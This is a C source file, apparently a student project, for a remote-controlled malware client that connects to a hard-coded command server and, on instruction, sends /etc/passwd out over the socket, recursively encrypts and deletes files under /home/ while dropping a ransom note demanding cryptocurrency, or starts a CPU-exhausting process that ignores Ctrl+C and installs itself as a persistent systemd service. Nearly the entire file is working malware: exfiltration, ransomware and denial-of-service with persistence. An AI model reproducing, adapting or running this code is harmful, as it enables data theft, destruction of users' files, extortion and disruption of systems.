// Créé par Raphael BIDAULT, Damien MARQUET, Thomas FROGER, Yvan NASSO

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <libgen.h>
#include <string.h>
#include <limits.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define SERVER_IP "192.168.50.79"   // A Modifier
#define PORT 8080                   // Port utilisé par le socket
#define BUF_SIZE 1024               // Variable pour fonction exfiltration


//Fonction exfiltration ------------------------------------

void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void exfiltration_client(int sock) {
    /*struct sockaddr_in serv_addr;
    */
   char buffer[BUF_SIZE] = {0};
   FILE *fp;

    printf("Fonction exfiltration en cours d'execution\n");

    printf("Envoi du fichier...\n");

    fp = fopen("/etc/passwd", "rb");
    if (fp == NULL) {
        die("Erreur : Fichier non ouvert");
    }else{
        printf("INFO : Fichier passwd ouvert\n");
    }

    while (!feof(fp)) {
        int bytesRead = fread(buffer, sizeof(char), BUF_SIZE, fp);
        send(sock, buffer, bytesRead, 0);
        printf("Envoi des données dans passwd en cours..\n");
    }

    printf("Fichier envoyé.\n");

    fclose(fp);
    close(sock);
}

// Fonction exfiltration End -----------------------------------------------------------

// Fonction Ransomware -------------------------------------------------

void parcourir_pour_chiffrer(char* chemin_debut_chiffrer);
void parcourir__pour_dechiffrer(char* chemin_debut_dechiffrer);
void crypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv);
void decrypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv);

void parcourir_pour_chiffrer(char* chemin_debut_chiffrer)
{
    unsigned char cle[] = "12345678901234561234567890123456"; // Clé de 32 caractères, soit 256 bits
    unsigned char iv[] = "1234567890123456"; // Taille identique au bloc, soit 16 caractères, soit 128 bits

    DIR* repertoire;
    struct dirent *entree;
    if ((repertoire = opendir(chemin_debut_chiffrer)) != NULL)
    {
        while ((entree = readdir(repertoire)) != NULL)
        {
            int longueur = strlen(entree->d_name);
            const char* extension = &entree->d_name[longueur - 4];
            if (strcmp(extension, ".enc") != 0)
            {
                if (entree->d_type == 8) // Vérifier si c'est un fichier ordinaire
                {
                    char* chemin_complet_readme = (char*)malloc(strlen("RANSOMWARE_INFO") + strlen(chemin_debut_chiffrer) + 2);
                    strcpy(chemin_complet_readme, chemin_debut_chiffrer);
                    strcat(chemin_complet_readme, "RANSOMWARE_INFO");

                    char* chemin_complet = (char*)malloc(strlen(entree->d_name) + strlen(chemin_debut_chiffrer) + 2);
                    strcpy(chemin_complet, chemin_debut_chiffrer);
                    strcat(chemin_complet, entree->d_name);

                    char* nouveau_nom = (char*)malloc(strlen(chemin_complet) + strlen(".enc") + 1);
                    strcpy(nouveau_nom, chemin_complet);
                    strcat(nouveau_nom, ".enc");

                    if (strcmp(chemin_complet, "/etc/passwd") != 0 && strcmp(chemin_complet, "/etc/shadow") != 0 && strcmp(chemin_complet, "/etc/sudoers") != 0)
                    {
                        FILE* entree_fichier;
                        FILE* sortie_fichier;
                        FILE* fichier_readme;

                        entree_fichier = fopen(chemin_complet, "rb");
                        sortie_fichier = fopen(nouveau_nom, "wb");
                        fichier_readme = fopen(chemin_complet_readme, "w");

                        fprintf(fichier_readme, "Vous avez été PIRATÉ ! \n\n Écoutez-moi ! Tous les fichiers m'appartiennent et sont dans un état crypté. Je n'ai que deux demandes simples.\n\n 1. Transférez de l'argent à mon adresse Osmosis \n 2. Envoyez-moi un email avec votre adresse Osmosis que vous avez utilisée pour envoyer l'argent. Ensuite, je vous enverrai un email avec un antidote \n\n Payez-moi maintenant ! \n Mon adresse Osmosis : Xg7665tgf677hhjhjhhh\n Email : d.marquet@ecole-ipssi.net \n");
                        fclose(fichier_readme);

                        crypter_fichier(entree_fichier, sortie_fichier, cle, iv);

                        fclose(entree_fichier);
                        fclose(sortie_fichier);
                        remove(chemin_complet);
                    }
                    free(chemin_complet);
                    free(nouveau_nom);
                }
                else if (entree->d_type == 4) // Vérifier si c'est un répertoire
                {
                    char* chemin_complet = (char*)malloc(strlen(chemin_debut_chiffrer) + strlen(entree->d_name) + 2);
                    strcpy(chemin_complet, chemin_debut_chiffrer);
                    strcat(chemin_complet, entree->d_name);
                    strcat(chemin_complet, "/");
                    //printf("%s\n", chemin_complet);
                    if (strcmp(chemin_complet, chemin_debut_chiffrer) != 0 && entree->d_name[0] != '.')
                    {
                        parcourir_pour_chiffrer(chemin_complet);
                    }
                    

                    free(chemin_complet);
                }
            }
        }
    }
    
}

void crypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv)
{
    const unsigned taille_buffer = 4096;
    unsigned char* buffer_lecture = malloc(taille_buffer);
    unsigned char* buffer_cipher;
    unsigned taille_bloc;
    int longueur_sortie;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); // Allocation dynamique

    EVP_CipherInit(ctx, EVP_aes_256_cbc(), cle, iv, 1);
    taille_bloc = EVP_CIPHER_CTX_block_size(ctx);
    buffer_cipher = malloc(taille_buffer + taille_bloc);

    // Lire le fichier et écrire dans le fichier chiffré jusqu'à la fin du fichier
    while (1)
    {
        int octets_lus = fread(buffer_lecture, sizeof(unsigned char), taille_buffer, entree);
        EVP_CipherUpdate(ctx, buffer_cipher, &longueur_sortie, buffer_lecture, octets_lus);
        fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);
        if (octets_lus < taille_buffer)
        {
            break; // Fin de fichier
        }
    }

    EVP_CipherFinal(ctx, buffer_cipher, &longueur_sortie);
    fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);

    free(buffer_cipher);
    free(buffer_lecture);
    EVP_CIPHER_CTX_free(ctx); // Libération de la mémoire
}


void parcourir_pour_dechiffrer(char* chemin_debut_dechiffrer)
{
    unsigned char cle[] = "12345678901234561234567890123456"; // Clé de 32 caractères, soit 256 bits
    unsigned char iv[] = "1234567890123456"; // Taille identique au bloc, soit 16 caractères, soit 128 bits

    DIR* repertoire;
    struct dirent *entree;
    if ((repertoire = opendir(chemin_debut_dechiffrer)) != NULL)
    {
        while ((entree = readdir(repertoire)) != NULL)
        {
            if (entree->d_type == DT_REG) // Vérifier si c'est un fichier ordinaire
            {
                int longueur = strlen(entree->d_name);
                const char* extension = &entree->d_name[longueur - 4];
                if (strcmp(extension, ".enc") == 0)
                {
                    char* chemin_complet =(char*)malloc(strlen(entree->d_name) + strlen(chemin_debut_dechiffrer) + 2);
                    strcpy(chemin_complet, chemin_debut_dechiffrer);
                    strcat(chemin_complet, entree->d_name);
                    char* nouveau_nom = (char*)malloc(strlen(chemin_complet) + 1);
                    strcpy(nouveau_nom, chemin_complet);
                    nouveau_nom[strlen(nouveau_nom) - 4] = '\0';

                    FILE* entree_fichier;
                    FILE* sortie_fichier;

                    entree_fichier = fopen(chemin_complet, "rb");
                    sortie_fichier = fopen(nouveau_nom, "wb");

                    if (entree_fichier != NULL && sortie_fichier != NULL)
                    {
                        decrypter_fichier(entree_fichier, sortie_fichier, cle, iv);
                        fclose(entree_fichier);
                        fclose(sortie_fichier);
                        remove(chemin_complet);
                    }
                    else
                    {
                        printf("Erreur lors de l'ouverture des fichiers.\n");
                    }
                    free(chemin_complet);
                    free(nouveau_nom);
                }
            }

            if (entree->d_type == DT_DIR) // Vérifier si c'est un répertoire
            {
                if (strcmp(entree->d_name, ".") != 0 && strcmp(entree->d_name, "..") != 0)
                {
                    char* chemin_complet = (char*)malloc(strlen(chemin_debut_dechiffrer) + strlen(entree->d_name) + 2);
                    strcpy(chemin_complet, chemin_debut_dechiffrer);
                    strcat(chemin_complet, entree->d_name);
                    strcat(chemin_complet, "/");
                    printf("%s\n", chemin_complet);
                    parcourir_pour_dechiffrer(chemin_complet);
                    free(chemin_complet);
                }
            }
        }
        closedir(repertoire);
    }
}

void decrypter_fichier(FILE * entree, FILE* sortie, unsigned char* cle, unsigned char* iv)
{
    const unsigned taille_buffer = 4096; // octets à lire
    unsigned char* buffer_lecture = malloc(taille_buffer); // tampon pour contenir le texte du fichier
    unsigned char* buffer_cipher; // texte déchiffré
    unsigned taille_bloc;
    int longueur_sortie;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); // Allocation dynamique

    EVP_CipherInit(ctx, EVP_aes_256_cbc(), cle, iv, 0); // 0 = déchiffrer, 1 = chiffrer
    taille_bloc = EVP_CIPHER_CTX_block_size(ctx);
    buffer_cipher = malloc(taille_buffer + taille_bloc);

    // Lire le fichier et écrire dans le fichier déchiffré jusqu'à la fin du fichier
    while(1)
    {
        int octets_lus = fread(buffer_lecture, sizeof(unsigned char), taille_buffer, entree);
        EVP_CipherUpdate(ctx, buffer_cipher, &longueur_sortie, buffer_lecture, octets_lus);
        fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);
        if (octets_lus < taille_buffer)
        {
            break; // Fin de fichier
        }
    }

    EVP_CipherFinal(ctx, buffer_cipher, &longueur_sortie);
    fwrite(buffer_cipher, sizeof(unsigned char), longueur_sortie, sortie);

    free(buffer_cipher);
    free(buffer_lecture);
    EVP_CIPHER_CTX_free(ctx); // Libération de la mémoire
}

// Ransomware End ---------------------------------------

// Fonction ForkBomb ----------------------------------------

#define NUM_CHILDREN 5

// Gestionnaire de signal pour ignorer CTRL+C et CTRL+Z
void signalHandler(int sig) {
    if (sig == SIGINT) {
        printf("CTRL+C détecté, mais ignoré\n");
    } else if (sig == SIGTSTP) {
        printf("CTRL+Z détecté, mais ignoré\n");
    }
}

void intensiveTask() {
    for (long i = 2; i < 1000000; i++) {
        int prime = 1;
        for (long j = 2; j < i; j++) {
            if (i % j == 0) {
                prime = 0;
                break;
            }
        }
    }
}

void createSystemdService(const char* execPath) {
    FILE *fp = fopen("/etc/systemd/system/monprogramme.service", "w");
    if (fp == NULL) {
        perror("Erreur en ouvrant le fichier de service");
        exit(EXIT_FAILURE);
    }

    fprintf(fp, "[Unit]\n");
    fprintf(fp, "Description=Mon Programme de Surcharge CPU\n\n");
    fprintf(fp, "[Service]\n");
    fprintf(fp, "ExecStart=%s\n", execPath);
    fprintf(fp, "Restart=always\n\n");
    fprintf(fp, "[Install]\n");
    fprintf(fp, "WantedBy=multi-user.target\n");

    fclose(fp);
    system("systemctl daemon-reload");
    system("systemctl enable monprogramme.service");
}

void runProgram(char *execPath) {
    // Associer SIGINT et SIGTSTP au gestionnaire de signal
    signal(SIGINT, signalHandler);
    signal(SIGTSTP, signalHandler);

    char newPath[PATH_MAX];
    snprintf(newPath, sizeof(newPath), "/usr/local/bin/%s", basename(execPath));

    char command[PATH_MAX * 2 + 10];
    snprintf(command, sizeof(command), "cp %s %s", execPath, newPath);
    system(command);

    createSystemdService(newPath);

    while(1) {
        for (int i = 0; i < NUM_CHILDREN; i++) {
            pid_t pid = fork();

            if (pid == 0) {
                printf("Processus enfant %d avec PID: %d\n", i + 1, getpid());
                intensiveTask();
                exit(0);
            } else if (pid > 0) {
                wait(NULL);
            } else {
                perror("Erreur de fork");
                exit(EXIT_FAILURE);
            }
        }

        sleep(1);
    }
}
// ForkBomb end ----------------------------------------------



int main(int argc, char const *argv[]) {
    struct sockaddr_in serv_addr;
    int sock = 0;
    int server_choice;

    printf("Création d'un socket client...\n");
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Erreur : Impossible de créer le socket \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    printf("INFO : Conversion de l'adresse IPv4 du texte en binaire...\n");
    if(inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        printf("\nErreur : Adresse invalide/ Adresse non prise en charge\n");
        return -1;
    }

    printf("Tentative de connexion au serveur...\n");
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nErreur : Echec de connexion avec le server \n");
        return -1;
    }
    
    // CONNEXION ETABLIE AVEC LE SERVEUR







    printf("Connexion établie avec le server. En attente de données... (1)\n");

    
    int running = 1;
    while (running)
    {
        sleep(1);
        read(sock, &server_choice, sizeof(server_choice));
        printf("Choix du serveur reçu : %d\n", server_choice);


        switch (server_choice) {

                //Choose number 1 Forkbomb
                case 1:
                    printf("-> Execution du malware Forkbomb\n");
                    char execPath[PATH_MAX];
                    realpath(argv[0], execPath);
                    runProgram(execPath);
                    return 0;
                    break;

                //Choose number 2 Exfiltration
                case 2:
                    printf("-> Execution du malware exfiltration de données...\n");
                    exfiltration_client(sock);
                    return 0;
                    break;


                case 3:
                    printf("-> Execution du malware ransomware (chiffrement) \n");
                    char* chemin_debut_chiffrer = "/home/"; // Remplacez avec le chemin du répertoire à chiffrer
                    parcourir_pour_chiffrer(chemin_debut_chiffrer);
                    printf("\nToutes les données ont été chiffrées ! \nVeuillez trouver le bloc-note créé !\n");
                    printf("\nL'attaquant peut déchiffrer vos données à distance \n");
                    printf("\nEn attente d'instruction du serveur...\n");
                    break;


                case 4:
                    printf("-> Execution du ransomware (dechiffrement)\n");
                    char* chemin_debut_dechiffrer = "/home/"; // Remplacez avec le chemin du répertoire à chiffrer
                    parcourir_pour_dechiffrer(chemin_debut_dechiffrer);
                    printf("\nToutes les données ont été déchiffrées !\n");
                    printf("\nEn attente d'instruction du serveur...\n");
                    break;

                case 5:
                    printf("Retour (Choisir un autre ID)\n");
                    running=0;
                    return 0;
                default:
                    printf("Choix non valide. Veuillez saisir un nombre entre 1 et 5.\n");
            }
    }



    close(sock);
    printf("La connexion avec le client a été interrompue.\n");

    return 0;
}
